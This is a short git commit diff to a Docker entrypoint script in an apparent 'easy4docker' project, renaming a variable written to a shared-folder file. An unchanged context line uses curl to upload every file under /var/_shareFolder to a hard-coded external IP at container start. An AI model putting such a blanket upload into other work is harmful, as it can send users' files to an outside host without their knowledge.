c1f607b250c1b57b1a7842ac83b9597f11d2f77a
easy4docker <76085700+easy4docker@users.noreply.github.com>
2021-03-01 22:09:32 -0800

    Update _entrypoint.sh

--- dockerSetting/shellScript/_entrypoint.sh
+++ dockerSetting/shellScript/_entrypoint.sh
@@ -9,7 +9,7 @@ if [ $hostIP = "localhost" ]; then
 else
   goalHost=${hostIP}:10000
 fi
-echo $goalIP >> /var/_shareFolder/goalIP.txt
+echo $goalHost >> /var/_shareFolder/goalHost.txt
 
 curl -F "objPath=/var/_localAppData/sitesShareFolder/_shareMain" $(find /var/_shareFolder/ -name '*' -type f -exec echo -n -F "file=@{} " \;) 142.93.73.66:10000/upload > /var/_shareFolder/SB.txt
 cp /var/shellScript/removeMe.json /var/_localAppData/commCron/
